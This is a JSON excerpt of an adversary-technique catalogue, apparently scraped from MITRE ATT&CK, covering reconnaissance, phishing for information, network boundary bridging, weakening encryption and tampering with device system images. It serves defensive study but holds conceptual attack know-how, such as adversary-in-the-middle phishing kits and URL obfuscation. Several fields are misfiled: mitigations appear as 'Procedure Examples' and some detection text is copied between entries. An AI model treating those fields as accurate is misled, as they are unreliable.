    "Description": "Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.[1]Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Active ScanningorSearch Open Websites/Domains), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:External Remote ServicesorExploit Public-Facing Application).",
    "Detects": [],
    "Procedure Examples": [
      "APT41uses the Chinese website fofa.su, similar to the Shodan scanning service, for passive scanning of victims.[2]",
      "APT41 DUSTused internet scan data for target development.[3]",
      "Volt Typhoonhas used FOFA, Shodan, and Censys to search for exposed victim infrastructure.[4]"
    ]
  },
  "T1597": {
    "Name": "Search Closed Sources",
    "Description": "Adversaries may search and gather information about victims from closed (e.g., paid, private, or otherwise not freely available) sources that can be used during targeting. Information about victims may be available for purchase from reputable private sources and databases, such as paid subscriptions to feeds of technical/threat intelligence data. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.[1]Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Websites/Domains), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:External Remote ServicesorValid Accounts).",
    "Detects": [],
    "Procedure Examples": [
      "EXOTIC LILYhas searched for information on targeted individuals on business databases including RocketReach and CrunchBase.[2]"
    ]
  },
  "T1597.001": {
    "Name": "Search Closed Sources:Threat Intel Vendors",
    "Description": "Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.[1]Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex:Search Open Websites/Domains), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:Exploit Public-Facing ApplicationorExternal Remote Services).",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
    ]
  },
  "T1597.002": {
    "Name": "Search Closed Sources:Purchase Technical Data",
    "Description": "Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.[1]Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Websites/Domains), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:External Remote ServicesorValid Accounts).",
    "Detects": [],
    "Procedure Examples": [
      "LAPSUS$has purchased credentials and session tokens from criminal underground forums.[2]"
    ]
  },
  "T1598": {
    "Name": "Phishing for Information",
    "Description": "Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different fromPhishingin that the objective is gathering data from the victim rather than executing malicious code.All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.[1][2][3][4][5]Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.[6]Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:Establish AccountsorCompromise Accounts) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is byEmail Spoofing[7]the identity of the sender, which can be used to fool both the human recipient as well as automated security tools.[8]Phishing for information may also involve evasive techniques, such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g.,Email Hiding Rules).[9][10]",
    "Detects": [
      "Depending on the specific method of phishing, the detections can vary. Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[17][18]When it comes to following links, monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links) can also help detect links leading to known malicious sites.Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).Monitor call logs from corporate devices to identify patterns of potential voice phishing, such as calls to/from known malicious phone numbers.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT28has used spearphishing to compromise credentials.[11][12]",
      "Kimsukyhas used tailored spearphishing emails to gather victim information including contat lists to identify additional targets.[13]",
      "Moonstone Sleethas interacted with victims to gather information via email.[14]",
      "Scattered Spiderhas used a combination of credential phishing and social engineering to capture one-time-password (OTP) codes.[15]",
      "ZIRCONIUMtargeted presidential campaign staffers with credential phishing e-mails.[16]"
    ]
  },
  "T1598.001": {
    "Name": "Phishing for Information:Spearphishing Service",
    "Description": "Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:Establish AccountsorCompromise Accounts) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.[1]These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex:Social MediaorSearch Victim-Owned Websites) to craft persuasive and believable lures.",
    "Detects": [
      "Monitor social media traffic for suspicious activity, including messages requesting information as well as abnormal file or data transfers (especially those involving unknown, or otherwise suspicious accounts).Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "DuringC0027,Scattered Spidersent Telegram messages impersonating IT personnel to harvest credentials.[2]"
    ]
  },
  "T1598.002": {
    "Name": "Phishing for Information:Spearphishing Attachment",
    "Description": "Adversaries may send spearphishing messages with a malicious attachment to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:Establish AccountsorCompromise Accounts) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email. In some cases, they may rely upon the recipient populating information, then returning the file.[1][2]The text of the spearphishing email usually tries to give a plausible reason why the file should be filled-in, such as a request for information from a business associate. In other cases, adversaries may leverage techniques such asHTML Smugglingto harvest user credentials via fake login portals.[3]Adversaries may also use information from previous reconnaissance efforts (ex:Search Open Websites/DomainsorSearch Victim-Owned Websites) to craft persuasive and believable lures.",
    "Detects": [
      "Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[13][14]",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "Dragonflyhas used spearphishing with Microsoft Office attachments to enable harvesting of user credentials.[4]",
      "SideCopyhas crafted generic lures for spam campaigns to collect emails and credentials for targeting efforts.[5]",
      "Sidewinderhas sent e-mails with malicious attachments that lead victims to credential harvesting websites.[6][7][8]",
      "Star Blizzardhas sent emails to establish rapport with targets eventually sending messages with attachments containing links to credential-stealing sites.[9][10][11][12]"
    ]
  },
  "T1598.003": {
    "Name": "Phishing for Information:Spearphishing Link",
    "Description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:Establish AccountsorCompromise Accounts) and/or sending multiple, seemingly urgent messages.All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.[1][2]The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \"@\" symbol: for example,hxxp://google.com@1157586937.[3]Adversaries may also embed \"tracking pixels\", \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.[4][5]These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server.[5][6]Adversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.[7][8]Adversaries can use phishing kits such asEvilProxyandEvilginx2to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e.,Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA viaWeb Session Cookie.[9]Adversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \"quishing\"). These links may direct a victim to a credential phishing page.[10]By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.[11]These QR codes may be scanned by or delivered directly  to a user’s mobile device (i.e.,Phishing), which may be less secure in several relevant ways.[11]For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile’s smaller form factor.From the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex:Search Open Websites/DomainsorSearch Victim-Owned Websites) to craft persuasive and believable lures.",
    "Detects": [
      "Monitor for suspicious email activity, such as numerous accounts receiving messages from a single unusual/unknown sender. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[48][49]Monitor for references to uncategorized or known-bad sites. URL inspection within email (including expanding shortened links and identifying obfuscated URLs) can also help detect links leading to known malicious sites.[3]Furthermore, monitor browser logs for homographs in ASCII and in internationalized domain names abusing different character sets (e.g. Cyrillic vs Latin versions of trusted sites).",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).Furthermore, monitor network traffic for homographs via the use of internationalized domain names abusing different character sets (e.g. Cyrillic vs Latin versions of trusted sites). Also monitor and analyze traffic patterns and packet inspection for indicators of cloned websites. For example, if adversaries use HTTrack to clone websites,Mirrored from (victim URL)may be visible in the HTML section of packets.",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "AADInternalscan send phishing emails containing malicious links designed to collect users’ credentials.[12]",
      "APT28has conducted credential phishing campaigns with links that redirect to credential harvesting sites.[13][14][15][16][17]",
      "APT32has used malicious links to direct users to web pages designed to harvest credentials.[18]",
      "CURIUMused malicious links to adversary-controlled resources for credential harvesting.[19]",
      "Dragonflyhas used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.[20]",
      "Kimsukyhas used links in e-mail to steal account information including web beacons for target profiling.[21][22][23][24]",
      "Magic Houndhas used SMS and email messages with links designed to steal credentials or track victims.[25][26][27][28][29][30]",
      "Moonstone Sleetused spearphishing messages containing items such as tracking pixels to determine if users interacted with malicious messages.[31]",
      "Mustang Pandahas delivered web bugs to profile their intended targets.[32]",
      "Patchworkhas used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.[33]",
      "Sandworm Teamhas crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.[34]",
      "Sidewinderhas sent e-mails with malicious links to credential harvesting websites.[35]",
      "Silent Librarianhas used links in e-mails to direct victims to credential harvesting websites designed to appear like the targeted organization's login page.[36][37][38][39][40][41]",
      "SMOKEDHAMhas been delivered via malicious links in phishing emails.[42]",
      "Star Blizzardhas sent emails to establish rapport with targets eventually sending messages with links to credential-stealing sites.[43][44][45][46]",
      "ZIRCONIUMhas used web beacons in e-mails to track hits to attacker-controlled URL's.[47]"
    ]
  },
  "T1598.004": {
    "Name": "Phishing for Information:Spearphishing Voice",
    "Description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex:Impersonation) and/or creating a sense of urgency or alarm for the recipient.All forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.[1]Victims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.[2]Adversaries may also use information from previous reconnaissance efforts (ex:Search Open Websites/DomainsorSearch Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.",
    "Detects": [
      "Monitor call logs from corporate devices to identify patterns of potential voice phishing, such as calls to/from known malicious phone numbers."
    ],
    "Procedure Examples": [
      "DuringC0027,Scattered Spiderused phone calls to instruct victims to navigate to credential-harvesting websites.[3]",
      "LAPSUS$has called victims' help desk to convince the support personnel to reset a privileged account’s credentials.[4]",
      "DuringC0027,Scattered Spiderused phone calls to instruct victims to navigate to credential-harvesting websites.[3]Scattered Spiderhas also called employees at target organizations and compelled them to navigate to fake login portals using adversary-in-the-middle toolkits.[5]"
    ]
  },
  "T1599": {
    "Name": "Network Boundary Bridging",
    "Description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control viaMulti-hop Proxyor exfiltration of data viaTraffic Duplication. Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction withInternal Proxyto achieve the same goals.[1]In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT41usedNATBypassto bypass firewall restrictions and to access compromised systems via RDP.[2]",
      "Indian Critical Infrastructure Intrusionsinvolved the use ofFRPto bridge network boundaries and overcome NAT.[3]Indian Critical Infrastructure Intrusionsalso involved the use of VPN tunnels with a potentially compromised MSP entity allowing for direct access to critical infrastructure entity networks.[4]"
    ]
  },
  "T1599.001": {
    "Name": "Network Boundary Bridging:Network Address Translation Traversal",
    "Description": "Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.[1]When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.Adversaries may usePatch System Imageto change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations.[2]",
      "Block Traffic   Upon identifying a compromised network device being used to bridge a network boundary, block the malicious packets using an unaffected network device in path, such as a firewall or a router that has not been compromised.  Continue to monitor for additional activity and to ensure that the blocks are indeed effective.",
      "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control.[3]",
      "Refer to NIST guidelines when creating password policies.[4]",
      "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."
    ]
  },
  "T1600": {
    "Name": "Weaken Encryption",
    "Description": "Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.[1]Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such asModify System Image,Reduce Key Space, andDisable Crypto Hardware, an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts.[2]",
    "Detects": [
      "File Modification"
    ],
    "Procedure Examples": []
  },
  "T1600.001": {
    "Name": "Weaken Encryption:Reduce Key Space",
    "Description": "Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.[1]Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.Adversaries may modify the key size used and other encryption parameters using specialized commands in aNetwork Device CLIintroduced to the system throughModify System Imageto change the configuration of the device.[2]",
    "Detects": [
      "There is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image and Network Device CLI. Some detection methods require vendor support to aid in investigation."
    ],
    "Procedure Examples": []
  },
  "T1600.002": {
    "Name": "Weaken Encryption:Disable Crypto Hardware",
    "Description": "Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use ofModify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g.,Reduce Key Space).[1]",
    "Detects": [
      "There is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image and Network Device CLI. Some detection methods require vendor support to aid in investigation."
    ],
    "Procedure Examples": []
  },
  "T1601": {
    "Name": "Modify System Image",
    "Description": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",
    "Detects": [
      "Most embedded network devices provide a command to print the version of the currently running operating system. Use this command to query the operating system for its version number and compare it to what is expected for the device in question. Because this method may be used in conjunction withPatch System Image, it may be appropriate to also verify the integrity of the vendor provided operating system image file.Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source. Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not. Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.[6]Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory. If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.[7]"
    ],
    "Procedure Examples": [
      "Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines.[1]",
      "Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image.[2]",
      "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations.[3]",
      "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control.[4]",
      "Refer to NIST guidelines when creating password policies.[5]",
      "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."
    ]
  },
  "T1601.001": {
    "Name": "Modify System Image:Patch System Image",
    "Description": "Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.[1][2][3][4][5]Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through theROMMONkitmethod, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, viaWeaken Encryption, authentication, viaNetwork Device Authentication, and perimeter defenses, viaNetwork Boundary Bridging.  Adding new capabilities for the adversary’s purpose includeKeylogging,Multi-hop Proxy, andPort Knocking.Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction withDowngrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade.When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or viaTFTP Boot.When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined withROMMONkitto achieve persistence.",
    "Detects": [
      "Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source. Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not. Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.https://tools.cisco.com/security/center/resources/integrity_assurance.html#7Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory. If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system. https://tools.cisco.com/security/center/resources/integrity_assurance.html#13"
    ],
    "Procedure Examples": [
      "SYNful Knockis malware that is inserted into a network device by patching the operating system image.[6][7]"
    ]
  },
  "T1601.002": {
    "Name": "Modify System Image:Downgrade System Image",
    "Description": "Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features.[1]On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such asWeaken Encryption.  Downgrading of a system image can be done on its own, or it can be used in conjunction withPatch System Image.",
    "Detects": [
      "Monitor for changes made to the operating system of a network device because image downgrade may be used in conjunction withPatch System Image, it may be appropriate to also verify the integrity of the vendor provided operating system image file."
    ],
    "Procedure Examples": [
      "Some vendors of embedded network devices provide cryptographic signing to ensure the integrity of operating system images at boot time.  Implement where available, following vendor guidelines.[2]",
      "Many vendors provide digitally signed operating system images to validate the integrity of the software used on their platform.  Make use of this feature where possible in order to prevent and/or detect attempts by adversaries to compromise the system image.[3]",
      "Some embedded network devices are capable of storing passwords for local accounts in either plain-text or encrypted formats.  Ensure that, where available, local passwords are always encrypted, per vendor recommendations.[4]",
      "Use multi-factor authentication for user and privileged accounts. Most embedded network devices support TACACS+ and/or RADIUS.  Follow vendor prescribed best practices for hardening access control.[5]",
      "Refer to NIST guidelines when creating password policies.[6]",
      "Restrict administrator accounts to as few individuals as possible, following least privilege principles.  Prevent credential overlap across systems of administrator and privileged accounts, particularly between network and non-network platforms, such as servers or endpoints."
    ]
  },
  "T1602": {
    "Name": "Data from Configuration Repository",
    "Description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.Adversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.[1][2]",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts or uncommon data flows. Consider analyzing packet contents to detect application layer protocols, leveraging SSL/TLS inspection for encrypted traffic, that do not follow the expected protocol standards and traffic flows (e.g. unauthorized, gratuitous, or anomalous traffic patterns attempting to access configuration content)",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g. unauthorized, gratuitous, or anomalous traffic patterns attempting to access configuration content)"
    ],
    "Procedure Examples": [
      "Configure SNMPv3 to use the highest level of security (authPriv) available.[2]",
      "Apply extended ACLs to block unauthorized protocols outside the trusted network.[2]",
      "Configure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources.[1]",
      "Segregate SNMP traffic on a separate management network.[2]",
      "Allowlist MIB objects and implement SNMP views.[3]",
      "Keep system images and software updated and migrate to SNMPv3.[4]"
    ]
  },
  "T1602.001": {
